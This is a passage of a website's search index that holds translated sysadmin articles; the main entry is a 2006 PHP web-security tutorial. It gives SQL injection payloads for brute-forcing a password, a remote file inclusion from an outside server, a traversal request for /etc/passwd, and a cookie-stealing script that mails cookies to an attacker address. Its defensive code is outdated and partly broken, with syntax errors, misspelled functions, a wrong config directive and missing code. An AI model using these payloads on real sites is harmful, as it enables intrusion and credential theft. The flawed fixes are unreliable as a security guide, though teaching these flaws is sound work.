                content: "SQL Injections linkSQL injection vulnerabilities are among the most common in web applications. Dynamic websites interact with databases that store user information. In some cases, it’s possible to manipulate queries to these databases to access often sensitive information.\nNote: this document was written in 2006; some versions and configurations of the software mentioned may differ from those specified here. Please refer to the official project websites in case of problems.\nThe language used to communicate between a PHP script and a database, such as MySQL (click), is the Structured Query Language, also known as SQL (click).\nTo do this, the web application must dynamically create a string containing the SQL query and send it to the database. This string can include data entered directly by website users.\nIf this data is not properly validated by the web application, it’s possible to hijack the application from its intended use by inserting SQL code into these user inputs.\nIn the following example, an attacker can inject their own SQL code into one of the queries made by the PHP script that we will study below.\nFirst, the database contains this SQL table:\nCREATE TABLE site_users( id int, pseudo varchar(32), password varchar(32), email varchar(80), adresse varchar(200) ); The “email.php” file on the website is a script that displays a person’s email based on their ID number. Here’s the content of this file:\n\u003c? mySQL_connect('127.0.0.1', 'root', ); mySQL_select_db('my_database'); $q = mySQL_query(\"SELECT email,pseudo FROM site_users WHERE id=\".$_REQUEST[id]); $r = mySQL_fetch_array($q); echo \"le mail de \".$r[pseudo];.\"est: \".$r[email]; ?\u003e On the link “site.com/email.php?id=45”, the website displays the message “le mail de lambda est exemple@secuobs.com”. Now if we try a URL like “site.com/email.php?id=45%20or%201=1”, the website then displays the message “le mail de exemple est php@secuobs.com”\nDuring this last request, the PHP script executed the following SQL code:\n\"SELECT email FROM site_users WHERE id=45 or 1=1\". Since the condition “1=1” is always true, we were able to inject SQL code. “exemple” is a test account with ID 1, and “lambda” is another test account with ID 45.\nIf we try with “id=999999999”, the web server will display the message “le mail de est”, because there is no user with an ID equal to this value of 99999999.\nIt will be possible, thanks to this SQL injection, to find a given user’s password with a brute force attack (click).\nUsing the SQL operators ‘LIKE’ and ‘%’, we’ll make sure that the following SQL command is executed by the web server to the database:\n\"SELECT email FROM site_users WHERE id=45 AND password LIKE 'a%'\" Which effectively means:\nemail.php?id=45%20AND%20password%20LIKE%20'a%' This SQL command will only return a response if the id field is equal to 45 and if the password field starts with ‘a’, hence the interest in using ‘%’. The password does not start with ‘a’, so the site displays the message “le mail de est”.\nWe continue by testing several letters until we get a response from the SQL server via the web server, that is, the message “le mail de lambda est exemple@secuobs.com”.\nTo find the length of the password, simply brute force its value using:\nemail.php?id=45%20AND%20LENGHT(password)=5 In this example, we find the value 5 as the password length.\nWe continue the operation until obtaining this user’s password:\nRequest: email.php?id=45%20AND%20password%20LIKE%20'a%' Response: \"le mail de est\" Request: email.php?id=45%20AND%20password%20LIKE%20'b%' Response: \"le mail de lambda est exemple@secuobs.com\" Request: email.php?id=45%20AND%20password%20LIKE%20'ba%' Response: \"le mail de est\" Request: email.php?id=45%20AND%20password%20LIKE%20'bb%' Response: \"le mail de est\" .... Request: email.php?id=45%20AND%20password%20LIKE%20'be%' Response: \"le mail de lambda est exemple@secuobs.com\" Request: email.php?id=45%20AND%20password%20LIKE%20'bea%' Response: \"le mail de lambda est exemple@secuobs.com\" Request: email.php?id=45%20AND%20password%20LIKE%20'beaa%' Response: \"le mail de est\" .... Request: email.php?id=45%20AND%20password%20LIKE%20'beac%' Response: \"le mail de lambda est exemple@secuobs.com\" Request: email.php?id=45%20AND%20password%20LIKE%20'beaca%' Response: \"le mail de est\" ... Request: email.php?id=45%20AND%20password%20LIKE%20'beach%' Response: \"le mail de lambda est exemple@secuobs.com\" The password for user “lambda” is therefore “beach”.\nTo secure this script, it would have been sufficient to replace the SQL query in the PHP script with the following line:\n$q = mySQL_query(\"SELECT email,pseudo FROM site_users WHERE id=\".intval($_REQUEST[id])); intval() returns a decimal integer value, so we can be certain that only numbers will be added to the SQL query. To secure a string of this type, place it between ’ or \" and verify that this string does not contain either of these two characters.\nIt’s also possible to use the SQL_real_escape_string() and mySQL_escape_string() functions for this purpose.\nThe first is a function of the MySQL library and the second is a function specific to the PHP language. They are effective only if the returned value is surrounded by quotes within the SQL query.\nThe second function, however, is now obsolete and it’s preferable to use the first one cited.\nExample of a secure script:\n\u003c? mySQL_connect('127.0.0.1', 'root', ); mySQL_select_db('my_database'); $pseudo = $_REQUEST[pseudo]; if (get_magic_quotes_gpc()) { $pseudo = stripslashes($pseudo); } $pseudo = mySQL_real_escape_string($pseudo); $q = mySQL_query(\"SELECT email FROM site_users WHERE pseudo='\".$pseudo.\"'\" ); $r = mySQL_fetch_array($q); echo \"le mail de \".$pseudo.\"est: \".$r[email]; ?\u003e Note that these functions do not protect against the use of % and _ characters; these characters can be used with the LIKE, GRANT, or REVOKE operators.\nThe MySQL_real_escape_string() function actually requires being already connected to the database to be used, otherwise a FALSE boolean value will be returned.\nIn this exploitation of SQL injection, we consider that magic quotes (click) are disabled in the PHP configuration file (php.ini).\nMagic quotes is enabled by default in the latest versions of PHP; this option transforms the characters 0x00 to \\0 in ASCII, ’ to ', and \" to \".\nHowever, there are many techniques and variants for exploiting an SQL injection even with magic quotes enabled.\nSession Management linkSessions allow a site to uniquely recognize a user with each request in order to offer them content that is specific to them. However, it’s possible for an attacker to steal a user’s session to impersonate them and access their private information.\nA session identifier is a value generally equal to 128 bits. This value is represented in hexadecimal (e.g., 4d7324727be3bd2e9783078e6d0806e7) and is used to identify a unique person.\nIt will allow the site to recognize a user with each of their requests in order to provide them with specific actions according to the information saved in the database (or not).\nThe session identifier must be difficult for an attacker to predict, otherwise the entire confidentiality of the service is compromised, and therefore that of its users.\nTo create a secure session identifier, you can use the uniqid() function provided by the PHP language:\nmd5(uniqid(rand(),true)); It’s important to create a session using the uniqid() function, because creating it solely by generating it randomly with a notion of date and time of creation could allow an attacker to retrieve these session identification information via brute force techniques in some cases.\nAnother type of attack on sessions exists, which consists of making the victim connect to the site with a session identifier that we will have defined beforehand; so if the victim then identifies themselves on the website with this identifier, we can access their session in order to impersonate them and retrieve sensitive information about their account.\nTo do this, one would simply need to create a fake website with a domain name resembling that of the targeted site; on this site one could set up a web redirect such as “index.php?PHPSESSID=fakesessid”. The link would then look like “index.php?PHPSESSID=4d7324727be3bd2e9783078e6d0806e7”:\n\u003c?php header('Location: www.site.com/index.php?PHPSESSID=1234'); ?\u003e It’s generally necessary for the victim’s cookie to also be empty or expired in order to be able to carry out this kind of attack. All that remains is to wait for the victim to identify themselves with their username and password and also go to the URL “index.php?PHPSESSID=fakesessid” to be able to access this victim’s session.\nTo secure your script against this kind of attack, simply regenerate an identifier as soon as authentication has been completed. The script must secure web applications against session identifiers that have never been created beforehand by the server; if there was only the session_start() function, the script would then be vulnerable to this type of attack.\nThe secure script:\n\u003c?php session_start(); if (!isset($_SESSION['initiated'])) { session_regenerate_id(); $_SESSION['initiated'] = true; } ?\u003e It’s also possible to regenerate the session identifier during authentication for more security, or even to regenerate it with each request to the server.\nPHP Vulnerabilities linkDetails of vulnerabilities related to the use of include() and fopen() functions in PHP scripts as well as those associated with Cross Site Scripting flaws, also known by the acronym XSS. Also find the security principles related to these different types of risks.\nThe include() Function linkThis function is fairly well known and used. It allows code to be modularized by dynamically loading a file and executing the PHP code it contains. It also handles local files and streams of type curl, http, ftp, and php.\nThis allows for code injection, an example with the file “fichiervuln.php” found on the vulnerable site:\n\u003c? include($_REQUEST[\"page\"]); ?\u003e And a file “hack.txt” hosted on any site:\n\u003c? phpinfo(); ?\u003e On a vulnerable site, you can notice links like “sitevuln.com/fichiervuln.php?page=contact.html”. To exploit the resulting flaw, simply go to the URL “sitevuln.com/fichiervuln.php?page=monserver.com/hack.txt”.\nWe can see that the phpinfo() function has been executed. A hacker can then take control of the server and execute other programs through the system() function, exec() or through a local PHP exploit.\nTo secure an include(), it’s necessary to properly validate the input variable $_REQUEST[“page”]:\n\u003c? $inrep = \"./\"; $extfichier = \".php\"; $page = $inrep.basename(strval($_REQUEST[\"page\"]),$extfichier).$extfichier; if(file_exist($page)) include($page); ?\u003e In the past, there have been many includes secured only with the file_exist() function which returns a positive response if the file exists locally.\nAs of PHP version 5, this function handles streams, notably http streams, so it no longer protects against remote code injection or local file code injection.\nThe strval() function is not necessary on recent versions of PHP. The best way to secure PHP code is still the following:\n\u003c? switch($_REQUEST[\"page\"]) { case \"contact.php\": include(\"contact.php\"); break; default: break; } ?\u003e This method is much less modular, but more optimized.\nThe fopen() Function linkThe fopen() function is very commonly used and allows opening a file or directory to display its content.\nGenerally, flaws related to this function are of the “directory traversal” type, meaning that the user exits the directory tree that had been normally assigned to them.\n\u003c? $filename = $_REQUEST[\"idimage\"]; $filepath = \"/rep/secret/\".$filename; $filesize = @filesize($filepath); $ext = substr($filename, strrpos($filename, \".\") + 1); if ($ext == \"jpg\") $ext = \"jpeg\"; if(@file_exists($filepath)){ Header(\"HTTP/1.1 200 OK\"); Header(\"Content-type: image/\" . $ext); Header(\"Content-Length: $filesize\"); Header(\"Content-Disposition: filename=$filename\"); Header(\"Content-Transfer-Encoding: binary\"); Header(\"Cache-Control: store, cache\"); // HTTP/1.1 Header(\"Pragma: cache\"); $fp = fopen($filepath, \"rb\"); if (!fpassthru($fp)) fclose($fp); } exit; ?\u003e This script normally allows uploading images. These are stored in a directory not accessible via the Web server (Apache in this case). So you must go through a PHP script to see the photos via a URL like “site.com/bimage.php?idimage=20050124.jpg”\nIn fact, this script allows reading any local file on the server, with a URL like this: “site.com/bimage.php?idimage=../../../../../../../../../../../etc/passwd”\nHere we retrieve the passwd file from the server. Using the well-known “../” we go up through directories. Note that on a SUN Solaris type operating system, the fpassthru() function also allows seeing the content of a directory.\nOn other operating systems, it’s necessary to use the appropriate functions to list directories after opening with the fopen() function.\nThis vulnerability therefore allows viewing the source code of an .htaccess file or that of an .htpasswd but also the php files themselves to extract SQL logins and passwords while looking for other flaws to exploit in these scripts.\nTo correctly validate variables given as parameters to a fopen(), a filter is necessary:\n\u003c? // Filtering ..\\ is only necessary on Windows operating systems if(eregi('../',$_REQUEST[\"idimage\"]) || eregi('..\\',$_REQUEST[\"idimage\"])) { echo \"bad input\"; exit();// we stop the script } //otherwise we continue $badext = \".php\" // we define file extensions to prohibit $filename = basename($filename,$badext); // allows removing the .php extension and getting the file name without associated directories $filepath = \"/rep/secret/\".$filename; // normal script continuation etc etc ?\u003e Don’t put a transcoding function after filtering a variable, otherwise it will make the filter completely useless and it would be easily circumvented.\nXSS: Cross Site Scripting linkCross Site Scripting is a client-side attack, performed by injecting HTML code into the browser. HTML being a tag-based description language, it is generally sufficient to be able to inject the characters \u003c and \u003e in order to exploit a vulnerability of this type:\n\u003c? Echo \"bienvenue \".$_REQUEST[nom]; ?\u003e This is the classic case of an XSS. Simply visit the URL \"site.com/vuln.php?nom=\"; so we can directly inject HTML code, javascript and all types of code that a browser is able to execute.\nGenerally magic quotes prevent using javascript with this principle, but here again it can be easily circumvented with a URL such as \"site.com/vuln.php?badvar=%3Cscript%3Ealert%28%22helloworld%22%29%3C/script%3E%3Cnoscript%3E%3Cscript%3E\u0026nom=\"\nThe badvar variable contains the javascript code that will display “helloworld”, we perform a simple document.write() of the site address.\nThe main use of XSS is cookie theft, its operation is very simple: just open a frame or window to a file storing the cookie passed as a parameter.\nThe javascript code allowing to steal the cookie would then be the following:\nThe page.php would look like:\n\u003c? $cookie = $_GET['cookie']; mail(\"mailduvoleur@hack.com\", \"le cookie\", \"$cookie\"); ?\u003e The thief therefore receives the cookie by email. Some cookies contain sensitive data that can allow identification on a site.\nTo protect against XSS, simply filter variables before displaying them on the output, this filtering is done using the htmlspecialchars() function which will convert the string to “displayable” HTML characters:\n\u003c? $out = htmlspecialchars($_REQUEST[nom]); Echo \"bienvenue \".$out; ?\u003e Remote PHP Vulnerability Scanner linkRemote PHP Vulnerability Scanner is a tool (among others) that allows testing the security of a website based on PHP scripts. RPVS is used via the command prompt in Windows.\nRPVS (click) is actually a multithreaded remote PHP vulnerability scanner. It detects basic PHP flaws that are most reported on the web:\nXSS: Cross Site Scripting (injection of HTML code into the victim’s browser), SQL Errors (19 different errors), to detect SQL injections that are feasible, File inclusion vulnerabilities with include() for example, Errors of the fopen() function, to detect functions of this type that are poorly protected. Errors of the include() function and resulting insecurities. The RPVS tool runs in two distinct steps.\nDuring the first step, it will crawl the site pages while staying within the domain and directory of the address passed as an argument.\nIt collects multiple information about dynamic web pages including variable names associated with pages and values given to each variable.\nForms and variables associated with these forms are also retrieved. It may happen that this first step is “endless” due to a so-called loop crawling. In this case, the “Attack Now” button allows stopping the information gathering and moving on to the next step.\nThe second step consists of testing the targeted PHP pages for XSS, include(), fopen() flaws and SQL injections with the same single variable.\nAt this level, there are three scanning modes which are represented by the options -bf, -f, the third and last being the default.\nThe default scan will take all URLs found directly on the site or reconstructed via forms.\nFor each URL, RPVS tests each variable one by one, for example “/123456/telechargement.php?outil=nmap.zip\u0026rep=./” will generate two URLs: “/123456/telechargement.php?outil=www.google.fr/webhp%3f%22%27 \u0026rep=./” and “/123456/telechargement.php?outil=nmap.zip\u0026rep=www.google.fr/webhp%3f%22%27”.\nThe -f option for “fast mode” will test all variables of a page at once, an example with ‘/123456/telechargement.php?outil=www.google.fr/webhp%3f%22%27 \u0026rep=www.google.fr/webhp%3f%22%27\u0026list=www.google.fr/webhp%3f%22%27 “. This mode is very fast but it’s also the one that gives the least results.\nThe -bf option allows trying all possible combinations of inputs. This scan is very slow but allows discovering flaws that other modes do not detect. It’s preferable to use it locally and with the verbose mode activated.\nExample:\n/123456/index.php3?search=www.google.fr/webhp%3f%22%27 /123456/index.php3?pages=www.google.fr/webhp%3f%22%27 /123456/index.php3?img=www.google.fr/webhp%3f%22%27\u0026page= /123456/index.php3?img=www.google.fr/webhp%3f%22%27\u0026page=membres /123456/index.php3?img=www.google.fr/webhp%3f%22%27\u0026page=forum /123456/index.php3?img=www.google.fr/webhp%3f%22%27\u0026page=gall The -v option for verbose mode displays the web addresses of the HTTP requests made.\nThe -aff option for anti-forum filter is simply a very useful filter that allows avoiding crawling all posts from a forum or news system.\nIt’s accompanied by the -sessid=PHPSESSID option to define the name of the variable equivalent to the session identifier, this allows not falling into an endless crawl.\nThe -rapport option allows creating a report in the rapport.txt file under the current directory.\nWhen launching the program, a transparent window appears with the following information:\nthe “nb:” indicators represent the number of HTTP requests made, “err fopen” the number of fopen() errors detected, “vuln inc” the number of include flaws, “err inc” the number of include errors, “vuln xss” the number of Cross Site Scripting flaws, “err SQL” the number of SQL errors, “url:” the last request being processed. Note that the “Attack Now” button switches to “Wait” as soon as the second step begins.\nTips linkIn this fourth and final part of the dossier on the security (and insecurity) of PHP scripts, we find some principles that will allow adding an additional layer of security to scripts developed in this language.\nNote: this document was written in 2006; some versions and configurations of the software used according to these versions may be different from those mentioned here; please refer to the official websites of the projects in question in case of problems.\nTo optimally secure a Web application, you can apply security rules that verify that no input has been modified by the visitor.\nFor each link, simply add a variable that will serve as a signature of validity for the request.\nTo generate secure links, the following code:\n\u003c? $secretkey = \"highly secret key \"; Echo \" code html …. \"; Echo \" The page.php file:\n\u003c? $secretkey = \"highly secret key \"; $realsign = md5($secretkey.$_REQUEST[\"var\"]); If($realsign != $_REQUEST[\"signature\"]) { Echo \"bad input value\"; Exit(); } … rest of the file ?\u003e This ensures that requests originate from the pages of our site.\nYou should also disable the display of error messages in the PHP configuration or using:\nini_set(\"error_display\",off); This should be placed at the beginning of the script, because each error message gives valuable information to a potential attacker.\nThere is also a technique for securing a form, which consists of placing a session number that will be stored in a table.\nWhen validating the form, we then check that this number is indeed in the table.\nAn essential tool for the security of your scripts is the hardened-PHP patch that can be found on the project’s official website (click).\nThe Suhosin project (click) is also worth studying.\nAdditional information is available in the following articles (XSRF flaws click) and (PHP flaws month - click).\nResources linkhttp://www.secuobs.com/news/10052008-php_security.shtml\n"
            }
        );
    index.add(
            {
                id:  640 ,
                href: "\/Mise_en_place_des_quotas_sous_Linux\/",
                title: "Setting up quotas on Linux",
                description: "A guide on how to implement and manage disk quotas on Linux systems to control user disk space usage.",
                content: "Introduction linkThe assignment of quotas in a file system is a tool that allows control of disk space usage. Quotas consist of setting a space limit for a user or a group of users.\nFor the creation of these quotas, 2 types of limits are defined:\nThe soft limit: indicates the maximum amount of space that a user can occupy on the file system. If this limit is reached, the user receives warning messages about exceeding their assigned quota. When used in combination with grace periods, if the user continues to exceed the soft limit after the grace period has elapsed, they will face the same restriction as when reaching a hard limit.\nThe hard limit: defines an absolute limit for space usage. The user cannot exceed this limit. Beyond this limit, writing to the file system is forbidden.\nAdditionally, these limits are expressed in blocks and inodes. The block is a unit of space. Quotas expressed in number of blocks therefore represent a space limit not to be exceeded. As for quotas expressed in number of inodes, they represent the maximum number of files and directories that the user can create.\nFor reference, grace periods set a time period before the soft limit is transformed into a hard limit. It is set in the following units: second, minute, hour, day, week.\nPrerequisites linkWe need to check for the presence of quotas at the kernel level (use the configuration file of your current kernel):\n$ grep QUOTA \u003c /boot/config-2.6.18-6-amd64 CONFIG_QUOTA=y Installation linkTo install quotas on Debian:\napt-get install quota Configuration link/etc/fstab linkQuotas are activated at startup with the quotaon command. Quotas are deactivated when the system shuts down with the quotaoff command.\nTo set quotas on a file system, you need to update the /etc/fstab file. You’ll need to add mount options for the file system(s) concerned. Two options can be used (and combined of course):\nusrquota: activates user quotas grpquota: activates group quotas Example:\n/dev/hdc1 /home ext3 defaults,usrquota 1 1 /dev/hdc2 /tmp ext3 defaults,grpquota 1 1 Creating the necessary structures for quotas to function linkOne or two files must be created for quota usage: aquota.user and aquota.group. These files will contain the quota configuration assigned to users and/or groups. These files must be created at the root of the file systems that include these quotas. Examples:\ntouch /home/aquota.user touch /tmp/aquota.group Attention: don’t forget to modify the permissions on these files! They must have read and write permissions for root only. Examples:\nchmod 600 /home/aquota.user chmod 600 /tmp/aquota.group Remount the file system(s) concerned to take into account the use of quotas for this file system:\nmount -o remount /home mount -o remount /tmp After creating these files, you need to initialize the quota database by executing the following command:\n$ quotacheck -auvg edquota: Quota file not found or has wrong format. No filesystems with quota detected. This is what happens if it doesn’t work. Enable quotas:\nquotaon -a Assignment and verification of quotas linkSetting quotas linkQuota assignment is done using the edquota command, which can be used for any type of quota (user or group). The command opens an editor (vi or emacs depending on the content of your EDITOR variable), which allows you to directly modify the aquota.user or aquota.group files.\nSyntax: edquota [-u user] [-g group] [-t] * -u user defines quotas for one or more users * -g group defines quotas for one or more groups * -t defines deadlines Example:\n$ edquota -u citrouille Disk quotas for user anne (uid 500): Filesystem blocks soft hard inodes soft hard /dev/hdc1 0 9000 10000 0 90000 10000 The file consists of 6 columns:\nFilesystem: file system affected by quotas blocks: number of blocks occupied by the user in the file system. Here no file has been created yet. soft: soft limit in number of blocks. Here it is set at 9,000 blocks or about 9 MB hard: hard limit in number of blocks (about 10 MB) inodes: number of inodes occupied by the user in the file system soft: soft limit in number of inodes hard: hard limit in number of inodes You will proceed in the same way for assigning quotas to a group. (Don’t try to edit these files directly; they are not in text format.)\nSetting a grace period linkWe’ve also seen that we can adjust the grace period between when a user reaches the soft limit and when they are banned from any further occupation in the file system. So we’re going to set the duration of this grace period. It will be the same for any user and/or group.\nExample:\n$ edquota -t Grace period before enforcing soft limits for users: Time units may be: days, hours, minutes, or seconds Filesystem Block grace period Inode grace period /dev/hdc1 7days 7days So you just need to replace the values with your values in the unit that suits you: second, minute, hour, day, week.\nExceeding quotas: what happens linkFor once, we’ll put ourselves in the user’s position. We’ll describe the main cases of exceeding quotas and the messages sent to the user.\nLet’s take the following example: User Anne has 9MB as a soft limit and 10MB as a hard limit. Her grace period is 7 minutes. Below is the content of the file system subject to these quotas:\n$ ls -l /home/anne total 1842 -rw------- 1 root root 7168 fév 28 23:50 aquota.user -rw-r--r-- 1 anne anne 1857516 mar 1 12:19 fic1 drwx------ 2 root root 12288 nov 28 12:59 lost+found We are well below the quotas. We will now copy file fic1 4 times. The first 3 copies go well and we have fic2, fic3 and fic4. Below is the last copy with user anne:\n$ cp fic1 fic5 ide1(22,10): warning, user block quota exceeded. $ ls -l total 9134 -rw------- 1 root root 7168 fév 28 23:50 aquota.user -rw-r--r-- 1 anne anne 1857516 mar 1 12:19 fic1 -rw-r--r-- 1 anne anne 1857516 mar 1 13:18 fic2 -rw-r--r-- 1 anne anne 1857516 mar 1 13:18 fic3 -rw-r--r-- 1 anne anne 1857516 mar 1 13:18 fic4 -rw-r--r-- 1 anne anne 1857516 mar 1 13:18 fic5 drwx------ 2 root root 12288 nov 28 12:59 lost+found The soft limit is exceeded. The user receives a message but the write is performed because we haven’t exceeded the hard limit.\n2 scenarios can then arise if the user does not contact the administrator or if they do not free up space to go back below the soft limit:\n1st case: the user tries to write to the file system which leads them to exceed the hard limit. $ cp fic1 fic6 ide1(22,10): write failed, user block limit reached. cp: écriture de `fic6': Débordement du quota d'espace disqueL'opération échoue. Une partie du fichier seulement a été copiée. l'utilisateur de pourra plus écrire dans le système de fichiers. 2nd case: the user lets the 7-minute grace period set by the administrator elapse. They then try to copy the contents of the /etc/passwd file for example. The total space occupied still remains less than the hard limit. The penalty will be identical to the 1st case. The operation fails:\n$ cp /etc/passwd . ide1(22,10): write failed, user block quota exceeded too long. cp: écriture de `./passwd': Débordement du quota d'espace disque L'opération a échoué comme en témoigne le listage ci-dessous: anne@pingu$ ls -l passwd -rw-r--r-- 1 anne anne 0 mar 1 14:48 passwd Similarly if you try to write to the passwd file, you will get the following message in your editor when saving:\n\"passwd\" erreur d'écriture (système de fichiers plein?) Appuyez sur ENTRÉE ou tapez une commande pour continuer Il vous est impossible d'écrire. Verification and display of quotas linkThe following commands will allow you to verify the quotas assigned to each group and/or user and possibly synchronize the information needed by the system to track these quotas.\nEditing quota-related information linkThe repquota command displays a summary of quota usage and grace periods.\nSyntax: repquota [ -vug ] -a | filesystem * -v: verbose mode, displays additional info * -u: displays information about user quotas * -g: displays information about group quotas * -a: displays information about all file systems with quotas * filesystem: displays information about quotas for the specified file system For the example, I added a user Bob.\n$ repquota -avug *** Report for user quotas on device /dev/hdc10 Block grace time: 00:07; Inode grace time: 00:07 Block limits File limits User used soft hard grace used soft hard grace ---------------------------------------------------------------------- root -- 19 0 0 2 0 0 anne -- 7293 9000 10000 5 9000 10000 bob +- 9000 8000 9000 00:07 5 8000 9000 + -- 19 0 0 2 0 0 Statistics: Total blocks: 7 Data blocks: 1 Entries: 3 Used average: 3,000000 Here we find information related to the quota imposed on users. There will be as many lines as there are users, groups and file systems concerned.\nThe quotas set in number of blocks and inodes are recalled. We also find the number of blocks and the number of inodes used. When a timestamp appears in the grace column, as for example for Bob, this means that the user (or group) has exceeded the soft limit. The grace period is therefore counting down.\nYou can also use the quota command followed by the name of a user or a group. Again you will get all the information relating to quotas and the use of the allocated space.\nExample: to obtain information related to quotas concerning Anne:\n$ quota anne Disk quotas for user anne (uid 500): Filesystem blocks quota limit grace files quota limit grace /dev/hdc10 7293 9000 10000 5 9000 10000 Verification and synchronization of quota files linkQuota files can sometimes become inconsistent. Management of these then becomes impossible. On the other hand, when you add a new user or a new group using the edquota command, you also need to synchronize the files to take into account this new information.\nSyntax: quotacheck [ -vug ] -a | filesystem * -v: verbose mode, displays additional info * -u: check only user quota files * -g: check only group quota files * -a: check quota files for all file systems that have them * filesystem: check quota files for the specified file system Example: check all quota files, regardless of the file system concerned:\n$ quotaoff -a $ quotacheck -auvg quotacheck: Scanning /dev/hdc10 [/home/anne/quota] done quotacheck: Checked 2 directories and 10 files That’s it for this tutorial on quotas. For more information, consult the man pages of the commands: repquota, quotaon, quotaoff, quotacheck, edquota.\nResources linkhttp://www.lea-linux.org/cached/index/Admin-admin_fs-quotas.html\n"
            }
        );
    index.add(
            {
                id:  641 ,
                href: "\/MX_Secondaire:_mise_en_place\/",
                title: "Secondary MX: Setup",
                description: "How to set up a secondary MX server with Postfix to handle emails during primary server downtime.",
                content: "Introduction linkWhen there’s only one mail server handling emails for a domain, if it becomes unavailable, emails sent by third parties to the primary server will be stored in the spool (outgoing queue) of the remote server for a few days in the best case, or immediately returned with an error message (depending on the problem or the configuration of the remote server).\nSince problems and unavailability are inherent in modern computing, it’s necessary to set up a system that can, at least in a degraded mode, transparently recover emails for the sender.\nWhat does the Secondary MX do? linkIts job isn’t very exciting (well, I think that’s the case for many web services)… It spends its time waiting for emails that arrive when the sending server couldn’t deliver to or contact the primary MX. When it receives them, it keeps them in its spool and tries at regular intervals to contact the primary server to transmit these emails.\nDon’t forget to set up your mail server as an MX in DNS!\nConfiguration of Postfix linkOn the secondary MX linkMain.cf linkEdit the /etc/postfix/main.cf file and adapt (use only one of these):\nmydestination = burnin.deimos.fr, deimos.fr, burnin, localhost relay_domains = $mydestination, mavro.fr The form enclosed in [] eliminates DNS MX lookups.\nBy default, the SMTP client performs DNS queries even if you specify a relay machine. If your machine doesn’t have access to the DNS server, disable DNS lookups of the SMTP client as follows:\ndisable_dns_lookups = yes For smtpd_recipient_restrictions, check that you have these two lines:\nsmtpd_recipient_restrictions = permit_mx_backup, permit_mynetworks, reject_unauth_destination Add this line to indicate the primary server:\ntransport_maps = hash:/etc/postfix/transport SMTP Banner: If you’ve set one with the machine name first, don’t forget to change it to your secondary mx name:\nsmtpd_banner = burnin.deimos.fr - Microsoft Exchange (5.5) Then insert this line to indicate the people to relay:\nrelay_recipient_maps = hash:/etc/postfix/relay_recipients transport linkCreate a file /etc/postfix/transport and insert this:\ndomain_to_relay smtp:[primary_server_FQDN] Example:\ndeimos.fr smtp:[fire.deimos.fr] mavro.fr smtp:[fire.deimos.fr] relay_recipients linkAnd now create the relay_recipients file:\nxxx@mycompany.com x xxx@mycompany.com x This must contain the names of the people to relay.\nmailname linkEdit the /etc/mailname file and put your DNS:\ndeimos.fr Validation linkLet’s validate everything now:\npostmap /etc/postfix/transport postmap /etc/postfix/relay_recipients And we reload the Postfix configuration:\n/etc/init.d/postfix reload On the primary MX linkNothing to do :-)\nVerifications linkTo see what we have in the spool:\nmailq If you’re in a hurry to retrieve your emails after bringing your primary server back up:\nmailq -q References linkOther documentation\n"
            }
        );
    index.add(
            {
                id:  642 ,
                href: "\/Monter_un_Hotspot_Wifi\/",
                title: "Setting up a WiFi Hotspot",
                description: "Guide for setting up a fully functional WiFi hotspot with OpenWRT, captive portal, and QoS",
                content: "Introduction linkOne of the things, if not THE thing I was dying to do in my new apartment, was to set up a real hotspot, as I explained in the two news posts below. Well, it’s now up and running. I don’t know yet if I’ll make a full article about it or if I’ll just give tips as I go along, but in the meantime, here’s what it looks like:\nInstallation and configuration linkTwo OpenWRT devices configured as simple bridges allow guests to connect to the VLAN dedicated to the public wireless network:\n# /etc/config/wireless config wifi-device wifi0 option type atheros option disabled 0 option mode 11b option distance 10000 option diversity 0 option txantenna 1 option rxantenna 1 option channel 6 config wifi-iface option device wifi0 option ifname ath0 option network lan option mode ap option ssid Empire-Network option encryption none option txpower 18 # /etc/config/network config interface loopback option ifname lo option proto static option ipaddr 127.0.0.1 option netmask 255.0.0.0 config interface lan option ifname eth0 ath0 option type bridge option proto static option ipaddr 192.168.200.253 option netmask 255.255.255.0 A DHCP server provides an IP in the appropriate subnet. A simple pf rule redirects all HTTP requests to a captive portal that explains to guests what information to enter in their browser to be able to use HTTP, HTTPS, and FTP (note that so far, only one out of about 30 has managed to complete this highly technical operation…). Some QoS rules ensure that guests don’t consume all my bandwidth:\n# /etc/pf.conf int=\"fxp0\" table { 192.168.200.0/24, ! 192.168.200.254, ! 192.168.200.253, ! 192.168.200.252 } altq on $int cbq bandwidth 28Mb queue { empirenet_in, empirenet_out } queue empirenet_in bandwidth 2Mb priority 1 cbq(default) queue empirenet_out bandwidth 128Kb priority 7 rdr on $int inet proto tcp from any to port www -\u003e 127.0.0.1 port 80 pass in on $int from any to queue empirenet_in pass out on $int from to any queue empirenet_out The user then goes through Squid, and their activity is filtered by squidGuard, in which I’ve blocked the categories !aggressive !violence !hacking !ads !porn !warez !suspect. I apply port-based access lists on the switch that only allow HTTP, SSH, and DHCP protocols.\n[...] ip access-list extended wifiout permit ip any host 192.168.200.254 permit tcp any any eq http permit udp any any eq bootps permit tcp any any eq ssh [...] interface e 18 ip access-group wifiout in [...] Everything is graphed by Cacti, notably thanks to the dhcpd-snmp extension of Net-SNMP and the associated Cacti template.\nIf you’re in the 17th arrondissement of Paris, look for the SSID “Empire-Network” :)\nResources linkhttp://imil.net/wp/?p=196\n"
            }
        );
    index.add(
            {
                id:  643 ,
                href: "\/Mise_en_place_d\u0027un_serveur_antispam_complet\/",
                title: "Setting up a complete antispam server",
                description: "Documentation about setting up a complete antispam server solution",
                content: "Here is a very complete and easy to implement documentation:\nDocumentation on a complete antispam solution\n"
            }
        );
    index.add(
            {
                id:  644 ,
                href: "\/Bacula_:_Mise_en_place_d\u0027un_serveur_de_Backup_Performant\/",
                title: "Bacula: Setting Up a High-Performance Backup Server",
                description: "Learn how to set up Bacula, a powerful backup solution with web interface, MySQL plugin, and file verification capabilities.",
                content: "Introduction linkBacula is a backup server that allows for the purchase of other commercial solutions with plugins for additional features. It also has the advantage of having a nice graphical web interface that creates beautiful graphs, etc.\nIn short, its competitor BackupPC, which I used for a long time, is very good, but doesn’t have all the advantages of Bacula such as checksum verification on files or a MySQL plugin.\nPrerequisites linkYou’ll need to set up some services before taking the plunge:\nA MySQL server A Web server like Apache with PHP Installation linkWe’ll do it under Debian, let’s stick to our good habits:\napt-get install bacula bacula-client bacula-common bacula-console bacula-director-common bacula-director-mysql bacula-fd bacula-sd bacula-sd-mysql bacula-server By default, Bacula installs with SQLite to make it quicker to set up, but the packages above are for MySQL. I chose to use this database server here because for the web graphical interface, you absolutely need to use MySQL or PostgreSQL. For simplicity, I chose MySQL :-)\nDuring the installation of the packages, you’ll be asked for the SQL server password so it can create everything it needs (database + user).\nConfiguration linkHere’s a diagram explaining the positioning of the configuration files. This helps to better plan how to arrange the structure of these files:\nAnd here’s how the files behave between themselves:\nLanguage linkThe configuration is not always obvious, which is why a little explanation does no harm to understand 